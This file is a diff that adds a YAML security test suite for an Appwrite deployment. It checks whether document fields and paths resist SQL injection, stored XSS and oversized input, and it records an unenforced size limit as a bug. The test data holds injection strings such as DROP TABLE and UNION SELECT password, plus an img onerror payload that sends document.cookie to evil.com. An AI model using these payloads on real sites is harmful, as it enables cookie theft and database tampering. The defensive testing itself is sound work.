@@ -1,0 +1,407 @@
+name: appwrite-input-validation
+description: >
+  Test input validation and injection resistance. Attempts SQL injection via document
+  fields and query parameters, XSS payloads in stored content, and oversized inputs.
+config:
+  timeoutSeconds: 600
+items:
+  - $ref: ../shared/appwrite-mariadb.yaml
+  - $ref: ../shared/appwrite-redis.yaml
+  - $ref: ../shared/appwrite-worker-db.yaml
+  - $ref: ../shared/appwrite-api.yaml
+variables:
+  adminEmail: admin@dokkimi.test
+  adminPassword: TestPass123!
+  projectId: injection-test
+tests:
+  - name: Input validation and injection resistance
+    steps:
+      # --- Setup ---
+      - name: Register admin
+        action:
+          type: httpRequest
+          method: POST
+          url: appwrite/v1/account
+          headers:
+            Content-Type: application/json
+            X-Appwrite-Project: console
+          body:
+            userId: 'unique()'
+            email: '{{adminEmail}}'
+            password: '{{adminPassword}}'
+            name: Admin
+        assertions:
+          - assertions:
+              - path: $.response.status
+                operator: eq
+                value: 201
+
+      - name: Admin session
+        action:
+          type: httpRequest
+          method: POST
+          url: appwrite/v1/account/sessions/email
+          headers:
+            Content-Type: application/json
+            X-Appwrite-Project: console
+          body:
+            email: '{{adminEmail}}'
+            password: '{{adminPassword}}'
+        extract:
+          fallbackCookies: $.response.headers.x-fallback-cookies
+        assertions:
+          - assertions:
+              - path: $.response.status
+                operator: eq
+                value: 201
+
+      - name: Create team
+        action:
+          type: httpRequest
+          method: POST
+          url: appwrite/v1/teams
+          headers:
+            Content-Type: application/json
+            X-Appwrite-Project: console
+            X-Fallback-Cookies: '{{fallbackCookies}}'
+          body:
+            teamId: 'unique()'
+            name: Injection Test Org
+        extract:
+          teamId: $.response.body.$id
+        assertions:
+          - assertions:
+              - path: $.response.status
+                operator: eq
+                value: 201
+
+      - name: Create project
+        action:
+          type: httpRequest
+          method: POST
+          url: appwrite/v1/projects
+          headers:
+            Content-Type: application/json
+            X-Appwrite-Project: console
+            X-Fallback-Cookies: '{{fallbackCookies}}'
+          body:
+            projectId: '{{projectId}}'
+            name: Injection Test
+            teamId: '{{teamId}}'
+        assertions:
+          - assertions:
+              - path: $.response.status
+                operator: eq
+                value: 201
+
+      - name: Create API key
+        action:
+          type: httpRequest
+          method: POST
+          url: appwrite/v1/projects/{{projectId}}/keys
+          headers:
+            Content-Type: application/json
+            X-Appwrite-Project: console
+            X-Fallback-Cookies: '{{fallbackCookies}}'
+          body:
+            name: Test Key
+            scopes:
+              - databases.read
+              - databases.write
+              - collections.read
+              - collections.write
+              - documents.read
+              - documents.write
+        extract:
+          apiKey: $.response.body.secret
+        assertions:
+          - assertions:
+              - path: $.response.status
+                operator: eq
+                value: 201
+
+      - name: Create database
+        action:
+          type: httpRequest
+          method: POST
+          url: appwrite/v1/databases
+          headers:
+            Content-Type: application/json
+            X-Appwrite-Project: '{{projectId}}'
+            X-Appwrite-Key: '{{apiKey}}'
+          body:
+            databaseId: inj-db
+            name: Injection Test DB
+        assertions:
+          - assertions:
+              - path: $.response.status
+                operator: eq
+                value: 201
+
+      - name: Create collection
+        action:
+          type: httpRequest
+          method: POST
+          url: appwrite/v1/databases/inj-db/collections
+          headers:
+            Content-Type: application/json
+            X-Appwrite-Project: '{{projectId}}'
+            X-Appwrite-Key: '{{apiKey}}'
+          body:
+            collectionId: notes
+            name: Notes
+            permissions:
+              - 'read("any")'
+              - 'create("any")'
+              - 'update("any")'
+              - 'delete("any")'
+        assertions:
+          - assertions:
+              - path: $.response.status
+                operator: eq
+                value: 201
+
+      - name: Create content attribute
+        action:
+          type: httpRequest
+          method: POST
+          url: appwrite/v1/databases/inj-db/collections/notes/attributes/string
+          headers:
+            Content-Type: application/json
+            X-Appwrite-Project: '{{projectId}}'
+            X-Appwrite-Key: '{{apiKey}}'
+          body:
+            key: content
+            size: 4096
+            required: false
+        assertions:
+          - assertions:
+              - path: $.response.status
+                operator: in
+                value: [201, 202]
+
+      - name: Wait for attribute
+        repeat:
+          count: 15
+          as: attempt
+          delayMs: 2000
+          until:
+            - path: $.response.body.status
+              operator: eq
+              value: available
+        action:
+          type: httpRequest
+          method: GET
+          url: appwrite/v1/databases/inj-db/collections/notes/attributes/content
+          headers:
+            X-Appwrite-Project: '{{projectId}}'
+            X-Appwrite-Key: '{{apiKey}}'
+
+      # --- SQL Injection Tests ---
+
+      - name: 'SQL injection in document field: DROP TABLE'
+        action:
+          type: httpRequest
+          method: POST
+          url: appwrite/v1/databases/inj-db/collections/notes/documents
+          headers:
+            Content-Type: application/json
+            X-Appwrite-Project: '{{projectId}}'
+            X-Appwrite-Key: '{{apiKey}}'
+          body:
+            documentId: 'unique()'
+            data:
+              content: "'; DROP TABLE _1_database_1_collection_1; --"
+            permissions:
+              - 'read("any")'
+        extract:
+          sqliDocId1: $.response.body.$id
+        assertions:
+          - assertions:
+              - path: $.response.status
+                operator: eq
+                value: 201
+
+      - name: 'SQL injection in document field: OR 1=1'
+        action:
+          type: httpRequest
+          method: POST
+          url: appwrite/v1/databases/inj-db/collections/notes/documents
+          headers:
+            Content-Type: application/json
+            X-Appwrite-Project: '{{projectId}}'
+            X-Appwrite-Key: '{{apiKey}}'
+          body:
+            documentId: 'unique()'
+            data:
+              content: '" OR 1=1 --'
+            permissions:
+              - 'read("any")'
+        extract:
+          sqliDocId2: $.response.body.$id
+        assertions:
+          - assertions:
+              - path: $.response.status
+                operator: eq
+                value: 201
+
+      - name: 'SQL injection in document field: UNION SELECT'
+        action:
+          type: httpRequest
+          method: POST
+          url: appwrite/v1/databases/inj-db/collections/notes/documents
+          headers:
+            Content-Type: application/json
+            X-Appwrite-Project: '{{projectId}}'
+            X-Appwrite-Key: '{{apiKey}}'
+          body:
+            documentId: 'unique()'
+            data:
+              content: "' UNION SELECT password FROM _metadata WHERE '1'='1"
+            permissions:
+              - 'read("any")'
+        extract:
+          sqliDocId3: $.response.body.$id
+        assertions:
+          - assertions:
+              - path: $.response.status
+                operator: eq
+                value: 201
+
+      - name: Verify table survived DROP TABLE injection
+        action:
+          type: httpRequest
+          method: GET
+          url: appwrite/v1/databases/inj-db/collections/notes/documents
+          headers:
+            X-Appwrite-Project: '{{projectId}}'
+            X-Appwrite-Key: '{{apiKey}}'
+        assertions:
+          - assertions:
+              - path: $.response.status
+                operator: eq
+                value: 200
+              - path: $.response.body.total
+                operator: gte
+                value: 3
+
+      - name: Verify injected content stored literally (not executed)
+        action:
+          type: httpRequest
+          method: GET
+          url: appwrite/v1/databases/inj-db/collections/notes/documents/{{sqliDocId1}}
+          headers:
+            X-Appwrite-Project: '{{projectId}}'
+            X-Appwrite-Key: '{{apiKey}}'
+        assertions:
+          - assertions:
+              - path: $.response.status
+                operator: eq
+                value: 200
+              - path: $.response.body.content
+                operator: eq
+                value: "'; DROP TABLE _1_database_1_collection_1; --"
+
+      # --- XSS Tests ---
+
+      - name: 'XSS payload: script tag'
+        action:
+          type: httpRequest
+          method: POST
+          url: appwrite/v1/databases/inj-db/collections/notes/documents
+          headers:
+            Content-Type: application/json
+            X-Appwrite-Project: '{{projectId}}'
+            X-Appwrite-Key: '{{apiKey}}'
+          body:
+            documentId: 'unique()'
+            data:
+              content: '<script>alert("xss")</script>'
+            permissions:
+              - 'read("any")'
+        extract:
+          xssDocId: $.response.body.$id
+        assertions:
+          - assertions:
+              - path: $.response.status
+                operator: eq
+                value: 201
+
+      - name: 'XSS payload: event handler'
+        action:
+          type: httpRequest
+          method: POST
+          url: appwrite/v1/databases/inj-db/collections/notes/documents
+          headers:
+            Content-Type: application/json
+            X-Appwrite-Project: '{{projectId}}'
+            X-Appwrite-Key: '{{apiKey}}'
+          body:
+            documentId: 'unique()'
+            data:
+              content: '<img src=x onerror="document.location=`http://evil.com/?c=${document.cookie}`">'
+            permissions:
+              - 'read("any")'
+        assertions:
+          - assertions:
+              - path: $.response.status
+                operator: eq
+                value: 201
+
+      - name: Verify XSS content returned unescaped (API stores raw, not Appwrite's job to sanitize)
+        action:
+          type: httpRequest
+          method: GET
+          url: appwrite/v1/databases/inj-db/collections/notes/documents/{{xssDocId}}
+          headers:
+            X-Appwrite-Project: '{{projectId}}'
+            X-Appwrite-Key: '{{apiKey}}'
+        assertions:
+          - assertions:
+              - path: $.response.status
+                operator: eq
+                value: 200
+              - path: $.response.body.content
+                operator: eq
+                value: '<script>alert("xss")</script>'
+
+      # --- SQL Injection in document ID ---
+
+      - name: 'SQL injection in document ID path parameter'
+        action:
+          type: httpRequest
+          method: GET
+          url: "appwrite/v1/databases/inj-db/collections/notes/documents/' OR '1'='1"
+          headers:
+            X-Appwrite-Project: '{{projectId}}'
+            X-Appwrite-Key: '{{apiKey}}'
+        assertions:
+          - assertions:
+              - path: $.response.status
+                operator: in
+                value: [400, 404]
+
+      # --- Oversized input ---
+      # BUG: Appwrite accepts content exceeding the attribute's declared size (4096).
+      # The size constraint is not enforced at the API layer.
+
+      - name: 'Oversized document field (exceeds attribute size) — accepted by Appwrite'
+        action:
+          type: httpRequest
+          method: POST
+          url: appwrite/v1/databases/inj-db/collections/notes/documents
+          headers:
+            Content-Type: application/json
+            X-Appwrite-Project: '{{projectId}}'
+            X-Appwrite-Key: '{{apiKey}}'
+          body:
+            documentId: 'unique()'
+            data:
+              content: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+            permissions:
+              - 'read("any")'
+        assertions:
+          - assertions:
+              - path: $.response.status
+                operator: eq
+                value: 201
